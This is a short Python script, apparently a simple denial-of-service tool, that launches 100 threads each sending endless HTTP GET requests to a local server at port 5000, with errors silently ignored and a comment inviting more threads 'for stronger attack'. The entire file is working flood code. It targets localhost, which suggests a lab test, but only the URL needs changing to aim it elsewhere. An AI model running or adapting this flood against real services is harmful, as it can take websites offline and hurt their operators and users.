import requests
import threading

URL = "http://127.0.0.1:5000"
THREADS = 100   # increase for stronger attack

def attack():
    while True:
        try:
            requests.get(URL)
        except:
            pass

for i in range(THREADS):
    t = threading.Thread(target=attack)
    t.start() 